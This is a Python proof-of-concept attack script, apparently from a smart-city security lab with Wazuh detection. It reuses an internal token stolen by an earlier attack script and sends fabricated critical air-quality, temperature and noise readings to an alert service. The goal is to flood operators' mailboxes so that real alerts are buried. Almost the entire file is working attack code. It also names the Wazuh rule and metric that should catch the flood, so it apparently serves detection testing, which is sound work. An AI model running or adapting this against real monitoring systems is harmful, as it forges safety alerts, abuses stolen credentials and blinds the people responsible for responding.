#!/usr/bin/env python3
"""
Threat 3 PoC: Email flood / alert fatigue — using the token stolen in Threat 2.

Attack chain (continues from apt_attack.py):
  1. Reads the internal_token extracted by apt_attack.py from /root/sc_token.txt
  2. Calls alert-service /check directly with fabricated critical sensor readings
  3. Alert-service calls send_email() for each request → logs event_type: email_sent
  4. Wazuh rule 100301 fires (10+ email_sent in 60s)
  5. Emails go through Postfix → SpamAssassin scores ALL_CAPS subjects → mailbox floods
  6. Operator experiences alert fatigue — real alerts buried under spam

Usage:
    python3 poc/spam_attack.py [--count 30] [--interval 0.3]
    python3 poc/spam_attack.py --target http://<ip>:5500 [--count 30]
"""
import argparse
import json
import subprocess
import time
import urllib.request
import urllib.error
from datetime import datetime, timezone

TOKEN_FILE = "/root/sc_token.txt"


def _detect_ip():
    try:
        out = subprocess.check_output(
            ["incus", "list", "smartcity-services", "-f", "csv", "-c", "4"],
            stderr=subprocess.DEVNULL, text=True,
        ).strip()
        for line in out.splitlines():
            if "eth0" in line:
                return line.split()[0]
    except Exception:
        pass
    return None

_ip = _detect_ip()
_default_target = f"http://{_ip}:5500" if _ip else "http://localhost:5500"

parser = argparse.ArgumentParser(description="Spam PoC — alert flood via stolen token")
parser.add_argument("--target", default=_default_target, help="Alert-service URL")
parser.add_argument("--token", default=None, help="Internal token (default: read from /root/sc_token.txt)")
parser.add_argument("--count", type=int, default=30, help="Number of fake alerts to inject")
parser.add_argument("--interval", type=float, default=0.3, help="Delay between requests (seconds)")
args = parser.parse_args()

token = args.token
if not token:
    try:
        with open(TOKEN_FILE) as f:
            token = f.read().strip()
    except Exception:
        pass
if not token:
    print(f"[!] No token found. Run apt_attack.py first, or pass --token <value>")
    raise SystemExit(1)

url = f"{args.target}/check"
ZONES = ["north", "center", "south"]

print(f"[*] Spam PoC — using extracted token: {token[:12]}...")
print(f"[*] Target  : {url}")
print(f"[*] Injecting {args.count} fake critical readings into alert-service")
print(f"[*] Detection: Wazuh rule 100301 (10+ email_sent in 60s)")
print()

sent = 0
failed = 0

for i in range(args.count):
    zone = ZONES[i % len(ZONES)]
    payload = json.dumps({
        "zone": zone,
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "aggregated": {
            "aqi":           {"avg": 487.0, "min": 480.0, "max": 495.0},
            "temperature_c": {"avg": 89.3,  "min": 85.0,  "max": 92.0},
            "noise_db":      {"avg": 142.0, "min": 138.0, "max": 145.0},
        },
    }).encode()
    req = urllib.request.Request(
        url, data=payload,
        headers={"x-internal-token": token, "Content-Type": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as r:
            sent += 1
        if sent % 5 == 0:
            print(f"[{datetime.now().strftime('%H:%M:%S')}] Injected {sent}/{args.count} fake alerts")
    except Exception as e:
        failed += 1
        if failed <= 3:
            print(f"[!] Request {i+1} failed: {e}")
    time.sleep(args.interval)

print(f"\n[+] Done. Injected={sent} Failed={failed}")
print(f"[+] Wazuh:      rule 100301 (email flood detected)")
print(f"[+] Prometheus: wazuh_alerts_total{{rule_id='100301'}}")
print(f"[+] Ops portal: check Inbox — operator mailbox should be flooded")
